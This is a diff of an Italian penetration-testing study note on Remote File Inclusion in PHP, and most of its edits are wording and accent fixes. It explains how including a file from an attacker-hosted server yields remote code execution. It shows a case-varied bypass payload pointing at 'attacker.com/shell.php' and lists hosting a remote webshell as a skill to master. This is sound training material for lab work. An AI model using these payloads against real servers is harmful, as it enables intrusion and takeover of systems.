@@ -1,15 +1,15 @@
 # RFI Techniques
 
-**Difficolta:** Advanced
+**Difficoltà:** Advanced
 **Time to Master:** 1.5h
 **Prerequisiti:** [02-LFI-Advanced.md](02-LFI-Advanced.md)
-**Lab:** HTB — macchine legacy con allow_url_include
+**Lab:** HTB (macchine legacy con allow_url_include)
 
 ---
 
 ## Obiettivo
 
-Sfruttare Remote File Inclusion quando il server include direttamente un file ospitato su un server remoto controllato dall'attaccante: porta a RCE immediata se sfruttabile, ma richiede una configurazione PHP oggi rara (`allow_url_include=On`).
+La RFI è il fratello più aggressivo della LFI: invece di leggere un file già presente sul server, lo fai scaricare ed eseguire un file che hai messo tu, sul tuo server. Quando funziona è quasi sempre RCE immediata, senza log poisoning né altri trucchi. Il problema è che oggi funziona raramente: richiede `allow_url_include=On`, disattivato di default da PHP 5.2 in avanti. Vale comunque la pena controllarla sempre, specie su macchine legacy — quando la trovi attiva, è uno dei modi più rapidi per prendere una shell.
 
 ---
 
@@ -19,10 +19,10 @@ Sfruttare Remote File Inclusion quando il server include direttamente un file os
 
 ```ini
 allow_url_fopen = On   ; default On
-allow_url_include = On ; default Off dalla 5.2 — raro trovarlo On oggi
+allow_url_include = On ; default Off dalla 5.2, raro trovarlo On oggi
 ```
 
-Senza `allow_url_include=On` la RFI classica non funziona: verifica sempre prima con un LFI locale se il target e vulnerabile a questa configurazione, o cerca altre vie (vedi [Wrappers-PHP.md](Wrappers-PHP.md)).
+Senza `allow_url_include=On` la RFI classica non funziona: verifica sempre prima con un LFI locale se il target è vulnerabile a questa configurazione, o cerca altre vie (vedi [04-Wrappers-PHP.md](04-Wrappers-PHP.md)).
 
 ---
 
@@ -91,7 +91,7 @@ hTtP://attacker.com/shell.php   (case variation, raro che funzioni ma economico 
 
 ## Lab Hands-On
 
-### Lab 1: HTB — macchina legacy con RFI
+### Lab 1: HTB (macchina legacy con RFI)
 **Obiettivo:** ottenere RCE via inclusione remota
 **Difficulty:** Difficile
 **Time:** 1h
@@ -105,15 +105,15 @@ hTtP://attacker.com/shell.php   (case variation, raro che funzioni ma economico 
 
 ## Common Mistakes
 
-- Dare per scontato che RFI funzioni sempre come LFI -> `allow_url_include=On` e raro nei sistemi moderni, verifica prima di perdere tempo
-- Dimenticare di avviare il server locale prima della richiesta -> la request al target fallira silenziosamente
+- Dare per scontato che RFI funzioni sempre come LFI -> `allow_url_include=On` è raro nei sistemi moderni, verifica prima di perdere tempo
+- Dimenticare di avviare il server locale prima della richiesta -> la request al target fallirà silenziosamente
 
 ---
 
 ## Link Utili
 
-- [PHP Manual — allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php)
-- [OWASP Testing Guide — RFI](https://owasp.org/www-project-web-security-testing-guide/)
+- [PHP Manual: allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php)
+- [OWASP Testing Guide: RFI](https://owasp.org/www-project-web-security-testing-guide/)
 
 ---
 
@@ -127,12 +127,7 @@ hTtP://attacker.com/shell.php   (case variation, raro che funzioni ma economico 
 
 ## Checklist di padronanza
 
-- [ ] So verificare se allow_url_include e attivo
+- [ ] So verificare se allow_url_include è attivo
 - [ ] So hostare e servire una webshell remota
 - [ ] Conosco alternative allo schema http:// per RFI
 
----
-
-## Note personali
-
-_(spazio libero)_
